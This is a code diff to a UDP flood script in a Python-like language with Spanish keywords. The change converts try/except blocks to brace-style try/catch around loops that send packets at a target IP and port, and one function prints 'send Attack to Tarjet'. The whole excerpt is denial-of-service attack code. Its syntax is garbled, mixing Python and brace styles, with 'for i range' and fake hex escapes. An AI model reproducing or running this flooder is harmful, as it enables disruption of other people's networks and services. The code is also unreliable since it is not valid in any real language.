@@ -21,15 +21,16 @@ var s = net.socket(net.AF_INET, net.SOCK_DGRAM)
 var p = ""
 a = t.time()
 while t.time() - a < time:
-try:
+intentar {
 for i in range(45):
 net.sendto(s, p, IP, Port)
 net.sendto(s, p, IP, Port)
 net.close(s)
 t.sleep_ms(25)
-except:
+} capturar (err) {
 net.close(s)
 print("[ ! ] Error.")
+}
 }
 
 funcion udpflood(IP, Port, time) {
@@ -38,14 +39,15 @@ var p = "/x62/x32/x137/x91/x63/x21/x86/x99/x62/x32/x137/x91/x63/x21/x86/x99/x62/
 a = t.time()
 print(f"send Attack to Tarjet: {IP:Port}")
 while t.time() - a < time:
-try:
+intentar {
 for i range(25):
 net.sendto(s, p, IP, Port)
 net.close(s)
 t.sleep_ms(25)
-except:
+} capturar (err) {
 net.close(s)
 print("[ ! ] Error.")
+}
 }
 
 si (select == 1) {
